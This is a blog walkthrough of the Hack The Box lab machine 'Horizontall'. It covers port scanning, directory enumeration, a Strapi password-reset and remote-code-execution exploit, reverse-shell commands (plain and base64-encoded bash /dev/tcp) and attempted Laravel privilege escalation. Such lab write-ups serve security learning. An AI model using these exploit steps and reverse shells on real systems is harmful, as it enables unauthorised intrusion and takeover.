<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="horizontall" /><meta name="author" content="am-a-circle" /><meta property="og:locale" content="en" /><meta name="description" content="Overview" /><meta property="og:description" content="Overview" /><link rel="canonical" href="https://am-a-circle.github.io//posts/horizontall/" /><meta property="og:url" content="https://am-a-circle.github.io//posts/horizontall/" /><meta property="og:site_name" content="am-a-circle" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-02-06T11:30:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="horizontall" /><meta name="twitter:site" content="@twitter_username" /><meta name="twitter:creator" content="@am-a-circle" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"am-a-circle"},"headline":"horizontall","dateModified":"2022-02-06T11:30:00+08:00","datePublished":"2022-02-06T11:30:00+08:00","description":"Overview","url":"https://am-a-circle.github.io//posts/horizontall/","mainEntityOfPage":{"@type":"WebPage","@id":"https://am-a-circle.github.io//posts/horizontall/"},"@type":"BlogPosting","@context":"https://schema.org"}</script><title>horizontall | am-a-circle</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="am-a-circle"><meta name="application-name" content="am-a-circle"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/avatar/avatar.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">am-a-circle</a></div><div class="site-subtitle font-italic">Logs of my roots.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/privesc/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>PRIVESC</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/am-a-circle" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>horizontall</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>horizontall</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> am-a-circle </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Feb 6, 2022, 11:30 AM +0800" >Feb 6, 2022<i class="unloaded">2022-02-06T11:30:00+08:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1265 words">7 min read</span></div></div><div class="post-content"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 595 378'%3E%3C/svg%3E" data-proofer-ignore data-src="/assets/img/htb/horizontall/horizontall6.png" class="preview-img" alt="Preview Image" width="595" height="378"><h2 id="overview">Overview</h2><div class="table-wrapper"><table><thead><tr><th>Box Difficulty<th>Link<tbody><tr><td>Easy<td><a href="https://app.hackthebox.com/machines/Horizontall">HTB</a></table></div><h2 id="recon">Recon</h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/HTB/Horizontall]
â””â”€# masscan <span class="nt">-p1-65535</span>,U:1-65535 10.10.11.105 <span class="nt">--rate</span><span class="o">=</span>1000 <span class="nt">-e</span> tun0
Starting masscan 1.3.2 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2022-01-06 06:10:59 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts <span class="o">[</span>131070 ports/host]
Discovered open port 22/tcp on 10.10.11.105                                    
Discovered open port 80/tcp on 10.10.11.105   
</pre></table></code></div></div><p>Enumerate ports that were found to be open:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/HTB/Horizontall]
â””â”€# nmap <span class="nt">-sVC</span> <span class="nt">-p</span> 22,80 10.10.11.105                                                                                                                             
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-06 01:18 EST
Nmap scan report <span class="k">for </span>horizontall.htb <span class="o">(</span>10.10.11.105<span class="o">)</span>
Host is up <span class="o">(</span>0.033s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 <span class="o">(</span>RSA<span class="o">)</span>
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: horizontall
|_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>7.27 seconds
</pre></table></code></div></div><p>Begin enumeration.</p><h2 id="http--tcp-80">HTTP- TCP 80</h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/HTB/Horizontall]
â””â”€# curl 10.10.11.105 <span class="nt">-v</span>
<span class="k">*</span>   Trying 10.10.11.105:80...
<span class="k">*</span> Connected to 10.10.11.105 <span class="o">(</span>10.10.11.105<span class="o">)</span> port 80 <span class="o">(</span><span class="c">#0)</span>
<span class="o">&gt;</span> GET / HTTP/1.1
<span class="o">&gt;</span> Host: 10.10.11.105
<span class="o">&gt;</span> User-Agent: curl/7.80.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> 
<span class="k">*</span> Mark bundle as not supporting multiuse
&lt; HTTP/1.1 301 Moved Permanently
&lt; Server: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
&lt; Date: Thu, 06 Jan 2022 06:17:21 GMT
&lt; Content-Type: text/html
&lt; Content-Length: 194
&lt; Connection: keep-alive
&lt; Location: http://horizontall.htb
&lt; 
&lt;html&gt;
&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;
&lt;body <span class="nv">bgcolor</span><span class="o">=</span><span class="s2">"white"</span><span class="o">&gt;</span>
&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
<span class="k">*</span> Connection <span class="c">#0 to host 10.10.11.105 left intact</span>
</pre></table></code></div></div><p>Add <code class="language-plaintext highlighter-rouge">horizontall.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/HTB/Horizontall]
â””â”€# <span class="nb">cat</span> /etc/hosts       
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.105    horizontall.htb

<span class="c"># The following lines are desirable for IPv6 capable hosts</span>
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</pre></table></code></div></div><p>Enumerate website, we can find a javascript file called <code class="language-plaintext highlighter-rouge">http://horizontall.htb/js/app.c68eb462.js</code></p><p><img data-proofer-ignore data-src="https://github.com/am-a-circle/am-a-circle.github.io/blob/main/assets/img/htb/horizontall/horizontall1.png?raw=true" alt="enter image description here" /> Copy to beautifier and beautify. We can find we see that the subdomain called, <code class="language-plaintext highlighter-rouge">http://api-prod.horizontall.htb/</code></p><p><img data-proofer-ignore data-src="https://github.com/am-a-circle/am-a-circle.github.io/blob/main/assets/img/htb/horizontall/horizontall3.png?raw=true" alt="enter image description here" /> Add <code class="language-plaintext highlighter-rouge">api-prod.horizontall.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p><pre><code class="language-bashâ”Œâ”€â”€(rootðŸ’€kali)-[/opt/HTB/Horizontall]">â””â”€# cat /etc/hosts                  
127.0.0.1       localhost
127.0.1.1       kali
10.10.11.105    horizontall.htb api-prod.horizontall.htb
</code></pre><p>Further enumerations shows <code class="language-plaintext highlighter-rouge">strapi</code> CMS at <code class="language-plaintext highlighter-rouge">/admin</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/HTB/Horizontall]
â””â”€# gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://api-prod.horizontall.htb <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 100 <span class="nt">-e</span> <span class="nt">-k</span> <span class="nt">-s</span> <span class="s2">"200,204,351,352,357,403,500"</span> <span class="nt">-x</span> <span class="s2">"txt,html,php,php.bak,bak,jsp"</span> 
<span class="o">===============================================================</span>
Gobuster v3.1.0
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:                     http://api-prod.horizontall.htb
<span class="o">[</span>+] Method:                  GET
<span class="o">[</span>+] Threads:                 100
<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
<span class="o">[</span>+] Negative Status codes:   404
<span class="o">[</span>+] User Agent:              gobuster/3.1.0
<span class="o">[</span>+] Extensions:              php,php.bak,bak,jsp,txt,html
<span class="o">[</span>+] Expanded:                <span class="nb">true</span>
<span class="o">[</span>+] Timeout:                 10s
<span class="o">===============================================================</span>
2022/01/06 02:20:54 Starting gobuster <span class="k">in </span>directory enumeration mode
<span class="o">===============================================================</span>
http://api-prod.horizontall.htb/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 413]
http://api-prod.horizontall.htb/reviews              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 507]
http://api-prod.horizontall.htb/users                <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 60] 
http://api-prod.horizontall.htb/admin                <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 854]
http://api-prod.horizontall.htb/Reviews              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 507]
http://api-prod.horizontall.htb/robots.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 121]
</pre></table></code></div></div><p><img data-proofer-ignore data-src="https://github.com/am-a-circle/am-a-circle.github.io/blob/main/assets/img/htb/horizontall/horizontall4.png?raw=true" alt="enter image description here" /></p><h2 id="shell-as-strapi">Shell as strapi</h2><p>Looks like there are several known exploit for strapi.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/HTB/Horizontall]
â””â”€# searchsploit strapi            
<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                                                          |  Path
<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Strapi 3.0.0-beta - Set Password <span class="o">(</span>Unauthenticated<span class="o">)</span>                                                                                      | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution <span class="o">(</span>RCE<span class="o">)</span> <span class="o">(</span>Authenticated<span class="o">)</span>                                                                    | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution <span class="o">(</span>RCE<span class="o">)</span> <span class="o">(</span>Unauthenticated<span class="o">)</span>                                                              | multiple/webapps/50239.py
<span class="nt">----------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
</pre></table></code></div></div><p>We can see that the version is <code class="language-plaintext highlighter-rouge">3.0.0-beta.17.4</code> which matches <code class="language-plaintext highlighter-rouge">multiple/webapps/50239.py</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/HTB/Horizontall]
â””â”€# curl api-prod.horizontall.htb/admin/init                                                                                      
<span class="o">{</span><span class="s2">"data"</span>:<span class="o">{</span><span class="s2">"uuid"</span>:<span class="s2">"a55da3bd-9693-4a08-9279-f9df57fd1817"</span>,<span class="s2">"currentEnvironment"</span>:<span class="s2">"development"</span>,<span class="s2">"autoReload"</span>:false,<span class="s2">"strapiVersion"</span>:<span class="s2">"3.0.0-beta.17.4"</span><span class="o">}}</span>
</pre></table></code></div></div><p>Letâ€™s run the exploit !</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/HTB/Horizontall]
â””â”€# locate 50239.py                                             
/usr/share/exploitdb/exploits/multiple/webapps/50239.py


â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/HTB/Horizontall]
â””â”€# python3 50239.py http://api-prod.horizontall.htb
<span class="o">[</span>+] Checking Strapi CMS Version running
<span class="o">[</span>+] Seems like the exploit will work!!!
<span class="o">[</span>+] Executing exploit


<span class="o">[</span>+] Password reset was successfully
<span class="o">[</span>+] Your email is: admin@horizontall.htb
<span class="o">[</span>+] Your new credentials are: admin:SuperStrongPassword1
<span class="o">[</span>+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQxNDU1Njk0LCJleHAiOjE2NDQwNDc2OTR9.1IlZN6UGnKntpUCHNT6ZZZlTnRv-NyiL3XOHHcC_etg


<span class="nv">$&gt;</span> <span class="nb">whoami</span>
<span class="o">[</span>+] Triggering Remote code executin
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Rember this is a blind RCE don<span class="s1">'t expect to see output
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
$&gt; bash -i &gt;&amp; /dev/tcp/[YOURIPADDRESS]/4242 0&gt;&amp;1
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don'</span>t expect to see output
<span class="o">{</span><span class="s2">"statusCode"</span>:400,<span class="s2">"error"</span>:<span class="s2">"Bad Request"</span>,<span class="s2">"message"</span>:[<span class="o">{</span><span class="s2">"messages"</span>:[<span class="o">{</span><span class="s2">"id"</span>:<span class="s2">"An error occurred"</span><span class="o">}]}]}</span>
<span class="nv">$&gt;</span> <span class="nb">echo</span> <span class="s1">'YmFzaCAtaSA+JiAvZGV2L3RjcC9bWU9VUklQQUREUkVTU10vNDI0MiAwPiYx'</span> | <span class="nb">base64</span> <span class="nt">--decode</span> | bash
<span class="o">[</span>+] Triggering Remote code executin
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Rember this is a blind RCE don<span class="s1">'t expect to see output
</span></pre></table></code></div></div><p>On our local machine</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>â”Œâ”€â”€<span class="o">(</span>rootðŸ’€kali<span class="o">)</span>-[/opt/HTB/Horizontall]
â””â”€# nc <span class="nt">-lvnp</span> 4242                                   
listening on <span class="o">[</span>any] 4242 ...
strapi@horizontall:~/myapi<span class="nv">$ </span><span class="nb">whoami</span><span class="p">;</span><span class="nb">id</span><span class="p">;</span><span class="nb">hostname
whoami</span><span class="p">;</span><span class="nb">id</span><span class="p">;</span><span class="nb">hostname
</span>strapi
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>strapi<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>strapi<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>strapi<span class="o">)</span>
horizontall
</pre></table></code></div></div><h2 id="shell-as-root">Shell as Root</h2><p>After running linpeas, we can see that there are several port open on localmachine. e.g. <code class="language-plaintext highlighter-rouge">127.0.0.1:3306 </code> and <code class="language-plaintext highlighter-rouge">127.0.0.1:8000</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>strapi@horizontall:/tmp<span class="nv">$ </span>wget http://[YOURIPADDRESS]:1235/linpeas.sh                                                                                                          
<span class="nt">--2022-01-07</span> 01:21:05--  http://[YOURIPADDRESS]:1235/linpeas.sh                                                                                                               
Connecting to <span class="o">[</span>YOURIPADDRESS]:1235... connected.                                                                                                                              
HTTP request sent, awaiting response... 200 OK                                                                                                                            
Length: 330173 <span class="o">(</span>322K<span class="o">)</span> <span class="o">[</span>text/x-sh]                                                                                                                                         
Saving to: â€˜linpeas.shâ€™                                                                                                                                                   
                                                                                                                                                                          
linpeas.sh                                 100%[<span class="o">======================================================================================&gt;]</span> 322.43K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.05s    
                                                                                                                                                                          
2022-01-07 01:21:05 <span class="o">(</span>6.13 MB/s<span class="o">)</span> - â€˜linpeas.shâ€™ saved <span class="o">[</span>330173/330173]                                                                                                      
                                                                                                                                                                          
strapi@horizontall:/tmp<span class="nv">$ </span>bash linpeas.sh
 
<span class="o">[</span>+] Active Ports
<span class="o">[</span>i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
tcp        0      0 127.0.0.1:8000          0.0.0.0:<span class="k">*</span>               LISTEN      -                    
tcp        0      0 127.0.0.1:3306          0.0.0.0:<span class="k">*</span>               LISTEN      -                    
tcp        0      0 0.0.0.0:80              0.0.0.0:<span class="k">*</span>               LISTEN      -                    
tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      -                    
tcp        0      0 127.0.0.1:1337          0.0.0.0:<span class="k">*</span>               LISTEN      1780/node /usr/bin/ 
tcp6       0      0 :::80                   :::<span class="k">*</span>                    LISTEN      -                    
tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      -        
</pre></table></code></div></div><p>We can see that it runs <code class="language-plaintext highlighter-rouge">Laravel v8 (PHP v7.4.18)</code>.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>strapi@horizontall:/tmp<span class="nv">$ </span>curl 127.0.0.1:8000                                                                                                                              
&lt;<span class="o">!</span>DOCTYPE html&gt;                                                                                                                                                           
&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>                                                                                                                                                          
    &lt;<span class="nb">head</span><span class="o">&gt;</span>                          
â€¦
..
â€¦
                    &lt;div <span class="nv">class</span><span class="o">=</span><span class="s2">"ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0"</span><span class="o">&gt;</span>
                            Laravel v8 <span class="o">(</span>PHP v7.4.18<span class="o">)</span>
                    &lt;/div&gt;
                &lt;/div&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/body&gt;
&lt;/html&gt;
</pre></table></code></div></div><p>There is an exploit for that version. The exploit <code class="language-plaintext highlighter-rouge">CVE-2021-3129</code> affects all <strong>Version: &lt;= 8.4.2</strong>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>â”Œâ”€â”€(rootðŸ’€kali)-[/opt/HTB/Horizontall]
â””â”€# searchsploit laravel                                                                                                                                         
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                          |  Path
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
...
Laravel 8.4.2 debug mode - Remote code execution                                                                                        | php/webapps/49424.py
...
---------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
</pre></table></code></div></div><p>Unfortunately, 49424.py does not work for me!</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>strapi@horizontall:/tmp<span class="nv">$ </span>wget http://[YOURIPADDRESS]:1235/49424.py
<span class="nt">--2022-01-07</span> 01:52:42--  http://[YOURIPADDRESS]:1235/49424.py
Connecting to <span class="o">[</span>YOURIPADDRESS]:1235... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4052 <span class="o">(</span>4.0K<span class="o">)</span> <span class="o">[</span>text/plain]
Saving to: â€˜49424.pyâ€™
 
49424.py                                   100%[<span class="o">======================================================================================&gt;]</span>   3.96K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      
 
2022-01-07 01:52:42 <span class="o">(</span>22.1 MB/s<span class="o">)</span> - â€˜49424.pyâ€™ saved <span class="o">[</span>4052/4052]
 
 
 strapi@horizontall:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x 49424.py 

strapi@horizontall:/tmp<span class="nv">$ </span>python3 49424.py http://127.0.0.1:8000 /var/www/html/laravel/storage/logs/laravel.log <span class="s1">'id'</span>
                                                                                                                                                                          
Exploit...                                                                         
strapi@horizontall:/tmp<span class="err">$</span>
